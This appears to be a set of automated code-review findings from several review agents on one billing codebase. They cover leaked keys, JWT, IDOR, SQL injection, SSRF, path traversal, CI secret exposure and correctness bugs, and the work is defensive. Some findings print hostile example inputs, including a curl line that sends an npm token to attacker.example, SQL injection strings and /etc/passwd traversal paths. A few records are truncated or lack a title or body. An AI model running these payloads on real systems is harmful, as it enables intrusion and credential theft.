The `acme_live_` prefix indicates a production credential, not a sandbox one.

Anyone with read access to the repo — plus anyone who later gets it via a fork, a clone, a CI log, or a build artifact — can charge, refund or read payment data through this key. Git history means deleting the line in a follow-up commit does not undo the exposure.

Actions: (1) revoke/rotate this key in the AcmePay dashboard now, treat it as compromised; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch); (3) purge the value from git history if the repository is public or widely cloned.

findings.title: Env-configurable API key replaced by a fixed live key literal
findings.body: `client()` previously resolved the key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, so each environment (dev, CI, staging, prod) supplied its own credential and a missing value failed loudly with a `KeyError`. After this change the key is a module-level constant whose value is prefixed `acme_live_`, so every environment — including tests and staging — will authenticate against the live payments account, and any `ACMEPAY_SECRET_KEY` already set in deployment config is silently ignored. Restore the environment lookup (or route it through whatever config/secret helper this service uses) and keep the fail-fast behaviour when the variable is absent.

findings.title: client() behavior change has no test asserting the key it uses
findings.body: client() switched from reading ACMEPAY_SECRET_KEY from the environment to using a hardcoded module constant. No test in this PR calls client() or asserts acmepay.api_key is set to any particular value — tests/fixtures/acmepay.py only defines a fixture (fake_client/TEST_KEY) but nothing invokes or asserts against billing.acmepay_client.client(). If this were reverted or further modified (e.g. reading from the wrong variable), nothing would fail.

findings.title: tenant_of returns an unauthenticated, caller-controlled tenant id
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, which skips signature checking and — in PyJWT — also disables the dependent claim checks (`exp`, `nbf`, `aud`, `iss`) because they are gated on verification. Anyone can mint a token body with any `tenant_id` and this function will return it, so any caller that uses the result to scope a query or pick a tenant context is trusting attacker input. The sibling `claims_for` on line 7 already performs a verified decode; `tenant_of` should derive the tenant from that verified claim set (e.g. `return claims_for(token)["tenant_id"]`) rather than re-decoding unverified. If the motivation was avoiding the `public_key()` lookup, cache the key instead of dropping verification — the cost of a key fetch is not comparable to cross-tenant data exposure.

_Also raised by the security agent:_ tenant_id read from a JWT with signature verification disabled

findings.title: Public function `tenant_of()` lacks documentation of signature skip
findings.body: The function `tenant_of()` is a public API that reads a claim directly from a JWT without verifying the signature. A caller could use this function believing it validates the token, when in fact any attacker can forge a token with an arbitrary tenant_id. The function must document that signature verification is intentionally disabled and when it is safe to call.

findings.title: No test coverage for new tenant_of() function
findings.body: The new tenant_of() function introduces security-sensitive behavior (reading tenant_id from an unverified JWT) with no accompanying test. Nothing would fail if this function were removed, returned the wrong tenant_id, or if a malformed/tampered token caused a KeyError. Since this is a security-relevant change (disabling signature verification), at minimum a test should assert that tenant_of() correctly extracts tenant_id from a valid token and that it behaves predictably on malformed input.

findings.title: Unguarded claim lookup raises KeyError for tokens without tenant_id
findings.body: `unverified["tenant_id"]` assumes the claim is always present. A well-formed token issued without a tenant (service tokens, older issuance format) will make this raise `KeyError`, which callers almost certainly do not expect from an auth helper and which will surface as a 500 rather than an auth failure. Use `unverified.get("tenant_id")` and let the caller decide, or raise a domain-specific auth error explicitly.

findings.title: update_payment_method mutates object without ownership check (IDOR)
findings.body:
`update_payment_method` resolves `pm_id` (attacker-controlled path/query parameter) straight into `PaymentMethod.get(pm_id)` on line 12 and then writes `body["billing_name"]` and persists with `pm.save()` on lines 13-14. No `require_owner(user, pm)` call appears anywhere in the function, even though `current_user(request)` is bound to `user` on line 11 and then never used — the authentication result is fetched and discarded. The read handler immediately above (line 6) does call `require_owner`, and `api/auth.py` documents that "Every object mutation must call this". Any authenticated user can therefore enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts. Fix by inserting `require_owner(user, pm)` between lines 12 and 13, before any mutation. Separately, `body["billing_name"]` is unvalidated and will raise a bare KeyError when the field is absent.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

findings.title: Public endpoint lacks documented authorization contract
findings.body: The `update_payment_method` function is a new public endpoint that mutates a `PaymentMethod` object without documenting its authorization contract. The repository context shows that `require_owner` is established as the pattern for authorization checks, with documentation stating 'Every object mutation must call this.' However, this endpoint loads an object by ID and mutates it without any authorization check or docstring explaining the contract. A caller reading only the function signature and name would reasonably assume this endpoint allows updating any payment method by ID, which is incorrect and dangerous.

findings.title: No test covers authorization on update_payment_method
findings.body: update_payment_method loads a PaymentMethod by id and mutates it without calling require_owner, unlike the adjacent get endpoint (line 6) which does. No test file is included in this diff, so there is nothing that would fail if a non-owner successfully updated another user's payment method via this endpoint.

findings.title: No handling for missing payment method or missing body key
findings.body: Line 12 assumes `PaymentMethod.get(pm_id)` returns an object; if the id does not exist and `get` returns `None`, line 13 raises `AttributeError` and the request surfaces as a 500 rather than a 404. Similarly, line 13 indexes `body["billing_name"]` directly, so a request body omitting that key raises `KeyError` — a 500 for what is a client input error. Add an explicit not-found check after the lookup and validate/default the body field before assignment.

findings.title: Rate limit removed from password reset endpoint
findings.body:
`request_reset` no longer carries the `@rate_limit("5/hour")` decorator, and the `from limits import rate_limit` import was dropped with it, so no throttling remains on this handler. The `email` parameter flows straight into `send_reset_email(email)` with no caller-supplied bound on request volume.

Unauthenticated impact: an attacker can (a) mail-bomb an arbitrary victim address with reset mails, (b) burn the outbound mail quota / reputation of the sending domain, and (c) if the response or timing differs for registered vs unregistered addresses, enumerate accounts at unlimited speed. Reset tokens themselves are also easier to grind if their entropy is anything less than ideal.

Either restore the decorator or point the handler at an equivalent control (gateway/WAF throttle, per-email cooldown before enqueueing the mail). If the limiter genuinely moved elsewhere, say where in the PR description so reviewers can verify it.

findings.title: No test guards against loss of rate limiting on request_reset
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`. There is no test in this diff (or referenced) that asserts repeated calls to this endpoint are throttled, so this behavior change would pass silently through any existing test suite. Add a test that calls `request_reset` more than 5 times in an hour and asserts subsequent calls are rejected/limited.

findings.title: read_export_preview skips _confined, allowing path escape
findings.body:
The sibling reader on line 14 resolves the caller-supplied `name` through `_confined(name)` before opening it; `read_export_preview` instead calls `os.path.join(EXPORT_ROOT, name)` directly. `os.path.join` does not confine: a `name` of `../../etc/passwd` produces a path outside `EXPORT_ROOT`, and an absolute `name` (e.g. `/etc/passwd`) causes `os.path.join` to discard `EXPORT_ROOT` entirely and return the absolute path. Since `name` is evidently request-supplied (that is why the neighbouring function normalises it), this reads arbitrary files. Route line 20 through the same `_confined(name)` helper so both entry points share one confinement rule.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined() on name

findings.title: Public handler lacks documentation of path handling contract
findings.body: The new `read_export_preview` function is a public handler that accepts a `name` parameter and opens files from it, but provides no documentation about path safety. A caller reading only the signature and adjacent code would reasonably expect it to use the same confinement pattern as `read_export` (which calls `_confined` on line 14), but it does not—it directly joins the name to `EXPORT_ROOT` without validation. This creates a realistic risk that the function will be used incorrectly. The docstring or a prominent code comment must clarify the path handling: either that `name` must be pre-validated by the caller, or if it is not meant to support path traversal prevention, that should be explicitly stated.

findings.title: No test coverage for new read_export_preview path handling
findings.body: read_export_preview builds a path via plain os.path.join instead of the _confined() helper used by the sibling handler, and no test exists to verify it rejects traversal-style names (e.g. '../secret'). Any regression or intentional bypass here would go unnoticed since nothing exercises this function.

findings.title: Ownership check removed: bulk_export leaks other tenants' reports
findings.body:
`require_owner` was dropped from the import and the `for report in reports: require_owner(user, report)` loop was deleted. `report_ids` comes straight from the request and is passed to `Report.get` with no filtering, so an authenticated caller can enumerate or guess IDs and receive `to_dict()` for reports belonging to any tenant. The retrieved `api/auth.py` states explicitly that every read of another tenant's data must go through `require_owner`.

Restore the check, or better, push the tenant predicate into the fetch (e.g. a single `Report.get_many(report_ids, tenant_id=user.tenant_id)`) so the performance goal is met without dropping the control: one query plus an authorised-set comparison is cheaper than N `Report.get` calls, which is where the actual cost was.

_Also raised by the security agent:_ Ownership check removed from bulk_export enables cross-tenant IDOR

findings.title: No test guards bulk_export's per-report ownership check
findings.body: The removal of the `require_owner` call means bulk_export now returns reports regardless of tenant ownership. Since no test file is part of this diff, if such a test previously existed it either wasn't run or doesn't exist; if it doesn't exist, nothing in the suite would catch this regression (e.g. a test asserting that a request for another tenant's report_id raises Forbidden or excludes that report from results). This is the untested behavior change that most needs coverage.

findings.title: `user` is now computed but never used
findings.body: After the ownership loop was removed, `user = current_user(request)` has no remaining consumer in the function. This is a direct signal that the authorisation step was deleted rather than replaced by an equivalent guard elsewhere; it will also trip most linters. If the intent was to move the tenant filter into the fetch, `user.tenant_id` should be feeding that query.

findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` interpolates both `term` and `status` into the SQL string with an f-string and then calls `execute(sql)` with no params. Any single quote in either argument terminates the literal and lets the caller append arbitrary SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%'; DROP TABLE customers; --"` reaches the driver as a second statement if multi-statement execution is enabled.

Fix by passing values as parameters, exactly as `get_customer` on line 5 already does, and by building the LIKE wildcards in Python rather than in the SQL text:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

findings.title: execute() called with interpolated SQL and no params, breaking its contract
findings.body: `billing.db.execute` documents that "`params` must carry every caller value", and the adjacent `get_customer` (line 5) honours that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead interpolates `term` and `status` directly into the SQL text and calls `execute(sql)` with `params=None`, so the driver receives a fully-formed statement with caller data as literal syntax. Any value containing a single quote terminates the literal and the remainder is parsed as SQL — arbitrary statement injection against the customers table. Rewrite as `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", ('%' + term + '%', status))` so the values travel in `params` as the helper requires.

findings.title: No test exercises search_customers
findings.body: search_customers is new, untested behavior. Since no test file is included in this diff, nothing would fail if the query logic were wrong (e.g., wrong filtering, broken escaping, or the injection vulnerability itself). A test with malicious input in `term`/`status` asserting parameterization would catch both a logic error and the injection.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check enforced on line 8
findings.body:
The function immediately above validates the destination host against `ALLOWED_HOSTS` and raises `ValueError("destination not allowed")` before issuing a request. `verify_endpoint` takes the same kind of caller-supplied `url` and passes it straight to `requests.get` with no host parse, no allowlist lookup and no scheme check, so the module's destination invariant is enforced on one code path and not the other. An attacker who can reach this function can make the server issue GETs to internal addresses (link-local metadata endpoints, loopback admin ports) and learn the outcome, since the status code is returned to the caller.

Apply the same parse-and-check the sibling function uses before the request. Also note that `requests.get` follows redirects by default, so an allowlist check alone is bypassable by pointing at an allowed host that 302s to an internal one — pass `allow_redirects=False` (or re-validate each hop) in addition to the host check.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches arbitrary caller-supplied URL

findings.title: New verify_endpoint function has no test coverage
findings.body: verify_endpoint(url) is a new public function that performs a live HTTP GET against a caller-supplied URL and returns the status code, but no test exercises it in this diff. Unlike the sibling function above (lines 8-10) which validates host against ALLOWED_HOSTS before making a request, verify_endpoint has no such check and no test would catch either its missing validation or any future regression in its behavior (e.g. if someone later adds validation and breaks it, or if the return value changes shape).

findings.title: Existing allowlist check is bypassable via HTTP redirects
findings.body:
The pre-existing sender validates the host against `ALLOWED_HOSTS` on line 8 and then calls `requests.post(url, ...)` on line 10. `requests` follows redirects by default, so an allowlisted destination can return `302 Location: http://169.254.169.254/...` and the POST body (plus any credentials or headers attached downstream) is replayed against an internal target. The pre-flight host check only constrains the first hop.

Since this PR is adding a second outbound call next to it, it is a good moment to centralise the guard: a single helper that validates scheme, validates the resolved IP is not private/loopback/link-local, and sets `allow_redirects=False`, used by both functions.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` that returns a status code reads as "tell me whether this endpoint is reachable/healthy". But `requests.get` raises `ConnectionError`, `Timeout` (the 5s timeout is the common case for an unreachable host), `TooManyRedirects` or `InvalidURL` rather than returning — so the exact failures a verification call exists to detect escape as exceptions instead of a value. Every caller must wrap this in a try/except to get a usable answer. Either catch `requests.RequestException` and return a sentinel, or document that the function signals failure by raising.

findings.title: Public function `verify_endpoint` lacks contract documentation
findings.body: The `verify_endpoint` function is a new public API entry point that fetches a caller-supplied URL without documented constraints or success criteria. A caller cannot determine from the function name and signature alone what this function does (Is it validating the URL format? Testing reachability? Checking webhook functionality?), what it returns (just a status code?), or what constitutes success. This is likely to cause misuse: callers may assume it returns a boolean, or that any non-error return means the endpoint is valid.

findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for the bucket `acme-customer-invoices`. This is the account-level guardrail that prevents a public ACL or bucket policy from ever taking effect; with all four off, any subsequent public ACL or policy (including one set by a misconfigured deploy, a CI job, or anyone with `s3:PutBucketPolicy`/`s3:PutObjectAcl`) will be honoured and customer invoice objects become world-readable. The PR description says only the assets bucket is deliberately public.

Fix: either delete this resource (the AWS default is all-blocked, and since AWS's April 2023 change new buckets block public access by default) or set all four attributes to `true`:

```hcl
resource "aws_s3_bucket_public_access_block" "invoices" {
  bucket                  = aws_s3_bucket.invoices.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

While you are here, the `invoices` bucket declared on lines 13-15 has no `aws_s3_bucket_server_side_encryption_configuration` and no versioning; for a bucket holding customer financial records both are normally required.

_Also raised by the correctness agent:_ Invoices bucket disables all S3 public access protections

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same kind of hex HMAC digest as `verify_stripe` directly above, but returns `expected == header`. Python's `==` on `str` short-circuits at the first differing byte, so the comparison time leaks a prefix-match length; an attacker who can replay a webhook with a guessed signature can recover the correct digest byte by byte and forge requests. The function one line above already uses the correct primitive. Change line 12 to `return hmac.compare_digest(expected, header)` so both providers verify identically.

Note the one behavioural difference to handle while switching: `compare_digest` raises `TypeError` if `header` is `None` or a non-ASCII/`bytes` mismatch, whereas `==` silently returns `False`. If callers can pass a missing header, coerce or guard (`if not header: return False`) as `verify_stripe`'s callers presumably already do.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: Public API with misleading security contract
findings.body: The function `verify_acmepay` exposes a public verification API that appears equivalent to `verify_stripe` (same name pattern, same parameters, same purpose), but implements timing-safe comparison differently. A caller who reasonably assumes both verification functions are secure will be wrong for `verify_acmepay`. The function name and signature do not signal that it uses an unsafe comparison, so the contract is violated.

findings.title: New verify_acmepay function has no test coverage
findings.body: verify_acmepay is a new security-relevant function (webhook signature verification) added with no accompanying test. Nothing in this diff would fail if the comparison logic were wrong (e.g., using == instead of hmac.compare_digest, or a broken hash algorithm). A test asserting correct/incorrect signature verification behavior should be added, mirroring whatever coverage exists for verify_stripe.

findings.title: Exception message and traceback returned in HTTP 500 response
findings.body:
`handle()` previously returned a fixed `"internal error"` string; it now serialises `str(exc)` and `traceback.format_exc()` into the response body. Anything an unhandled exception carries goes to the caller: absolute filesystem paths and module layout from the traceback frames, library and framework versions inferable from the frame paths, and whatever the exception message embeds — SQL fragments and column names from driver errors, hostnames and ports from connection errors, and occasionally credentials that appear in a DSN or in a repr'd argument. An attacker can drive this deliberately by sending malformed input until something raises, and use the differences between responses to map the backend before attacking it.

Keep the generic body for the client and rely on the `log.exception` call on line 8 for debugging. If per-request correlation is the actual need, return an opaque identifier (`{"error": "internal error", "request_id": rid}, 500`) and log the same id alongside the traceback. If verbose output is wanted locally, gate it on an explicit debug flag that is off by default, so production cannot fall into the verbose branch by omission.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and reads ambient exception state

_Also raised by the correctness agent:_ 500 response body shape changed: new key, non-deterministic `error` value

findings.title: Public error handler return contract undocumented
findings.body: The `handle()` function is a public error handler that now returns exception text and traceback to clients. This is a significant change to its contract — it shifts from returning an opaque error message to leaking internal implementation details. If this function is called by route handlers or middleware that expose it to clients, callers need to understand this behaviour to avoid information disclosure. Either document this return contract with a docstring that explains when and why internals are leaked, or reconsider whether this is the intended behaviour.

findings.title: No test asserts the shape of the error response
findings.body: The `handle` function's return value changed from a generic message to one embedding exception details and a full traceback, but no test in this diff exercises `handle()` and checks what it returns. If this behavior is later reverted or altered further, nothing would fail to signal it either way.

findings.title: Reset password hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` produces an unsalted MD5 digest of the raw password. MD5 is a fast, GPU-friendly hash with no salt and no work factor: an attacker who obtains the stored value (database dump, backup, log) recovers the plaintext via rainbow tables or brute force almost immediately, and identical passwords across users produce identical digests. The same module already does the right thing one function above (`hash_password` uses `bcrypt.hashpw` with `bcrypt.gensalt()`), so any value produced by the reset path is stored under a materially weaker control than the normal signup path \u2014 and if reset-path hashes are written into the same credential column, they silently downgrade those accounts.

Fix: call the existing `hash_password(raw)` from the reset flow rather than introducing a second hashing routine. If the intent was to hash a one-time reset *token* rather than a password, use `hashlib.sha256` with a random high-entropy token and compare with `hmac.compare_digest`, and rename the function so it is not mistaken for password storage.

findings.title: Reset path writes a hash format bcrypt verification cannot read
findings.body:
`hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char hex MD5 digest. Any stored credential written by the reset flow is in a different, unlabelled format, so the existing verification path will either reject every post-reset login or (worse) `bcrypt.checkpw` will raise on a non-bcrypt salt string. Unless there is a format-discriminating verifier that was not added here, this makes password reset produce unusable credentials.

The reset flow should call `hash_password` so that stored credentials have exactly one format; if a separate short-lived reset *token* hash was intended, it should not be named or used as a password hash and should not be stored in the password column.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with write permissions, and (unlike `pull_request`) it is granted these even for pull requests opened from forks by users with no write access.

The diff then does the two things that make that context unsafe:

1. Line 11-12 override the checkout ref to `github.event.pull_request.head.sha`, so the working tree is the untrusted fork's code rather than the base branch.
2. Line 13 executes `./scripts/measure.sh` from that untrusted tree, and lines 14-15 place `secrets.NPM_TOKEN` in its environment.

Entry point: the contents of `scripts/measure.sh` (and anything it sources, plus any `package.json` lifecycle scripts or tooling config it invokes) on the attacker's fork branch. Sink: the `run:` step on line 13, i.e. a shell on the runner with `NPM_TOKEN` and the job's `GITHUB_TOKEN` in scope. An attacker opens a PR from a fork that replaces `measure.sh` with `curl -d "$NPM_TOKEN" attacker.example`, and the token is published. With the default write-scoped `GITHUB_TOKEN` they can also push to the repository.

Remediations, in order of preference:
- Revert to `on: pull_request`. If the only reason for the change was that fork PRs did not get the check, note that `pull_request` does run on fork PRs — it just runs without secrets, which is the point.
- If a secret is genuinely required, split into two workflows: an unprivileged `pull_request` job that checks out and builds the fork code and uploads an artifact, and a `workflow_run` job that consumes the artifact without ever executing fork code.
- If `pull_request_target` must be kept, do not check out the head SHA and do not execute anything from it; add an explicit `permissions: contents: read` block and drop `NPM_TOKEN` from the step.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with repository secrets

findings.title: json.dumps raises TypeError for contexts the old key accepted
findings.body:
The previous key only required context keys to be mutually sortable and the values to be hashable — arbitrary objects (datetime, Decimal, a model instance, a set) were perfectly valid template context values and cached fine. `json.dumps` accepts none of those and raises `TypeError: Object of type X is not JSON serializable` before `_render` is ever called, so any existing caller passing a non-primitive context now fails outright instead of rendering.

Either pass a tolerant serialiser (`json.dumps(..., default=repr)`) or keep the structural key and hash `repr`/`pickle` of it. If a tolerant `default` is used, make sure it is injective enough that two different objects do not produce the same string.

findings.title: No test covers the new JSON-serializability requirement for context
findings.body: The cache key used to be built from `tuple(sorted(context.items()))`, which tolerated any hashable/orderable values. The new implementation calls `json.dumps([template_source, context], sort_keys=True)`, which will raise `TypeError` for context values that aren't JSON-serializable (e.g. sets, custom objects, datetimes) even though those same values would have worked with the old tuple-based key. None of the added tests use anything beyond plain ints, so this behavior change — a new class of inputs that now raises instead of caching — is untested and would go unnoticed by this PR's test suite.

findings.title: Test only checks shell=False, not the constructed argv
findings.body:
`test_runs_without_a_shell` asserts `spy.last_call.kwargs["shell"] is False` but never inspects `spy.last_call.args` (the actual command list). The security-relevant part of this change is that `name` and `directory` are passed as separate list elements to `subprocess.run` rather than interpolated into a shell string — that's what actually prevents injection now that `shell=False`. If a future edit reverted to building the command via string formatting (e.g. `["sh", "-c", f"tar -czf ... {directory}"]`) while still passing `shell=False`, this test would keep passing even though the injection risk would return. The test should also assert on the positional args list, e.g. that `directory` appears as its own list item and that no shell metacharacters could be interpreted.

_Also raised by the correctness agent:_ Test relies on a `spy` fixture that is not defined in this change

findings.title: `directory` reaches tar unvalidated; caller trust is unverifiable here
findings.body: `name` is now tightly allowlisted, but `directory` flows straight from the parameter into the argv on line 12 with no validation. The `--` before it correctly stops it being read as a tar option, and there is no shell, so this is not command injection. The residual risk is scope: if any caller passes a user-influenced path, `create_archive` will happily tar `/etc` or `/home/<user>/.ssh` into `/exports/<name>.tar.gz`, which is a directory whose name suggests it may be served or synced. If the intent is that archives only ever come from a fixed data root, consider resolving `directory` and asserting it stays under that root (`os.path.realpath(directory).startswith(ROOT)`), which also closes symlink escapes. If all callers are internal and pass constants, this is not worth changing.

findings.title: New ValueError rejects names the old implementation accepted (e.g. dots)
findings.body: `create_archive` previously accepted any `name` and interpolated it into the command. The new allowlist `[A-Za-z0-9_-]{1,64}` rejects dots, dots-in-dates, spaces, and colons, so previously working callers passing names like `nightly.2024-01-01`, `team/nightly`, or anything over 64 characters now raise `ValueError` at runtime instead of producing an archive. Worth confirming against actual call sites what naming shapes are in use; if timestamped or dotted names are expected, widen the pattern to include `.` (while still excluding `/` and `..`) or normalise the name before validating. Relatedly, a non-string `name` (e.g. `None`) now raises `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: test_renders_empty_invoice contains no assertion
findings.body:
`test_renders_empty_invoice` calls `render(Invoice(lines=[]))` and discards the result with no assertion. It will pass for any return value — empty string, `None`, a malformed document — and only fails if `render` raises. If the intent is to pin down the empty-invoice boundary case, assert the expected output, e.g. that the rendered string still contains the header/total section, or `assert render(Invoice(lines=[])) == "<expected>"`.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion

findings.title: Test asserts only on mock call_count, not actual output
findings.body:

findings.title: csv_rows joins raw values without calling csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never routes values through `csv_escape`, which is defined immediately below for exactly this purpose. Any field whose value contains a comma, a double quote, or a newline emits a line with the wrong number of fields — e.g. `{"a": "x,y", "b": 1}` with columns `["a","b"]` yields `x,y,1`, which parses as three columns. `csv_header` has the same exposure for column names. Wrap the stringified value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: csv_rows emits unescaped field values, bypassing csv_escape
findings.body:
`csv_rows` joins `str(r.get(c, ""))` with commas and never calls `csv_escape`, which is defined immediately below it for exactly this purpose. Any row value containing a comma, a double quote or a newline shifts or splits columns in the produced CSV, so a caller that stores user-supplied text in a row can influence the structure of the exported document (and, for values beginning with `=`, `+`, `-` or `@`, the formulas a spreadsheet application evaluates when the export is opened — CWE-1236).

Route each field through `csv_escape` (and extend `csv_escape` to cover newlines and to coerce non-strings, since it currently does `"," in value` on whatever it is handed). Using `csv.writer` from the standard library would remove the class of bug entirely.

findings.title: Blocking requests.get inside async fetch_plan_limits stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def`, so callers will `await` it and the runtime will schedule it on the event loop thread. But the body calls `requests.get(...)`, which is synchronous: it blocks the thread until the response arrives or the 5-second timeout fires. Nothing else on that loop — including the awaited `fetch_plan` right above — can make progress during that window, so a single slow billing.internal response serialises the whole process.

The declaration is also misleading: because there is no `await` in the body, the coroutine never yields, so it gains none of the concurrency the `async` keyword implies.

Fix by using the same async client as `fetch_plan`, e.g. accept an `httpx.AsyncClient` (or construct one in an `async with`) and `response = await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If the sync library must stay, wrap it in `anyio.to_thread.run_sync` / `asyncio.to_thread` so the blocking work leaves the loop thread.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds the request URL by f-string interpolation of `tenant_id` with no validation or percent-encoding, and calls an internal, presumably unauthenticated-from-the-network-perimeter host (`https://billing.internal`). If `tenant_id` originates from a request parameter, a value such as `../../admin/keys` or `x?override=1` or `x#` lets a caller reach arbitrary paths on the internal billing service — a server-side request forgery against an internal endpoint that external clients cannot otherwise reach. `requests.get` also follows redirects by default, so a response from billing that redirects would be followed to whatever host it names.

Fix: validate `tenant_id` against the expected shape (e.g. UUID or `^[A-Za-z0-9_-]+$`) and/or encode it with `urllib.parse.quote(str(tenant_id), safe="")` before interpolation, and consider `allow_redirects=False` for an internal service call. The same unencoded interpolation exists at line 6 for the httpx client; if `tenant_id` is caller-supplied, fix both at the source.

findings.title: try_consume checks and updates _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await asyncio.sleep(0)` on line 18, and then writes `_counters[tenant] = current + cost` on line 19 — all outside `async with _lock`. Two consequences on a single event loop:

1. Limit overrun: any number of coroutines can pass the `current + cost > LIMIT` check on line 16 using the same stale `current`, then each resume after the await and admit its cost. With N concurrent callers the effective ceiling is roughly `LIMIT + (N-1)*cost`.
2. Lost updates: line 19 writes an absolute value computed from the pre-await snapshot rather than incrementing. Any `consume()` call (which does take `_lock`) that lands during the await has its increment overwritten, so the counter silently under-reports usage — and `_lock` gives no protection because `try_consume` never acquires it.

Wrap the read/check/write in `async with _lock:` and compute the new value from a re-read inside the critical section (`_counters[tenant] = _counters.get(tenant, 0) + cost`), or drop the `await` and make the whole body a synchronous critical section.

_Also raised by the security agent:_ Rate limit bypassable: check-then-act across await without the lock

findings.body:
The `err` bound by `if _, err := db.Exec(...); err != nil` is scoped to the if-statement, so the branch only logs it. Control then falls through to `var err error; return err`, which declares a fresh zero-valued (nil) error and returns it — `WriteSettlement` therefore reports success even when the settlement row was never inserted, and callers that check the returned error will never see a failure. The preceding `WriteEntry` (lines 7-8) correctly returns the Exec error, so this is inconsistent with the file's own contract.

    if _, err := db.Exec("INSERT INTO settlements (id, cents) VALUES ($1, $2)", s.ID, s.Cents); err != nil {
        log.Printf("settlement insert failed: %v", err)
        return err

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition, so every call that omits the argument shares the same list object. Line 10 appends into it and line 11 returns it, so the second call returns the first call's failures plus its own, and the list grows for the lifetime of the process (a slow memory leak as well as a wrong result). Also, the returned list is the live shared object, so a caller mutating it corrupts subsequent calls.

Use the same `None` sentinel pattern already used one line above in this file:

```python
def send_with_retries(recipients, attempted=None):
    attempted = [] if attempted is None else attempted
```

findings.title: Shared mutable default leaks recipients across calls and grows unbounded
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that omits the argument mutates and returns the *same* list object. Two consequences with security weight:

1. Information disclosure across callers: a caller of `send_with_retries(my_recipients)` receives a list that also contains failed recipients from every previous invocation in the process, including those belonging to other users/tenants/requests. Recipient addresses are typically PII, and the caller has no way to tell which entries were theirs.
2. Unbounded growth: nothing ever clears the list, so a sustained stream of dispatch failures (which an attacker can often induce by supplying addresses that fail, or simply by downstream outage) grows a process-lifetime list monotonically — a slow memory-exhaustion path.

Fix by using the standard sentinel pattern already used two lines above in this file: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted) if attempted else []`.

findings.title: Rounding comparison flipped from >= 0.5 to > 0.5 during rename
findings.body: This function was supposed to be a pure rename, but the predicate changed: the old body was `return 1 if line.remainder_cents >= 0.5 else 0` and the new one is `return 1 if line.remainder_cents > 0.5 else 0`. Exact 0.5 remainders are not a rare edge case in currency splitting (any even split of an odd cent amount produces one), so this will shift totals by a cent and break any ledger reconciliation or test that asserts round-half-up. If the change is intentional it belongs in its own commit with a test; otherwise restore `>=`.

findings.title: File handle leaks on validation-failure and exception paths
findings.body:
`fh = open(path)` is only closed on the success path (line 16). When `header != expected_header` the function returns at line 14 with the handle still open, and any exception from `next(reader)` or `list(reader)` (decode error, I/O error, `StopIteration`) escapes the same way. On CPython the handle is reclaimed non-deterministically by refcounting, and on PyPy/under exception tracebacks holding a reference it may stay open long enough to exhaust descriptors when importing many files.

Use the same pattern as `read_rows` above:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        header = next(reader, None)
        if header != expected_header:
            return None
        return list(reader)
```

findings.title: Retry wraps non-idempotent charge, risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. That function's docstring states it is NOT idempotent — each call creates a new charge. A retry only sees that the call raised or timed out, not whether the gateway actually processed the POST; a response-side timeout after a successful charge will be retried and the customer will be billed two or three times.

The gateway already offers the fix: it supports an `Idempotency-Key` header. Generate a stable key once per logical charge (outside the retried function, so the same key is reused across attempts) and pass it through `charge(...)`. Only then is retrying safe. Failing that, drop the decorator here and let the caller decide, or restrict retries to errors that provably occurred before the request was sent (e.g. connection-establishment failures).

_Also raised by the security agent:_ Retry on non-idempotent charge without an Idempotency-Key

The wrapper function must document either (1) that it passes an Idempotency-Key to make retries safe, or (2) the unsafe precondition under which it may be called. findings.body: `invoices_tenant_created_idx2` is defined on `invoices (tenant_id, created_at DESC)` \u2014 identical table, column list and sort order to `invoices_tenant_created_idx`, created in `migrations/0007_invoice_indexes.sql` and applied 2025-11-02.
